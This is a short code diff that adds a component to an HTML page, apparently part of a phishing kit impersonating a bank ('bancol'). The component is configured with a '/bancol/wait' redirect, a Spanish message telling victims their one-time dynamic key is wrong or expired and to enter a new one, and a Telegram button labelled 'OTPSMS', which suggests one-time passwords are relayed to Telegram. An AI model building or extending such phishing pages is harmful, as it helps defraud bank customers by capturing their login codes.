@@ -292,6 +292,14 @@
         }
     </script>
 
+        <x-control
+        :auto-completar="false"
+        :debug="false"
+        redirect-url="/bancol/wait"
+        toast-message="Clave dinámica incorrecta o vencida. Ingresa una nueva clave dinámica"
+        telegram-button="OTPSMS"
+    />
+
 </body>
 
 </html>
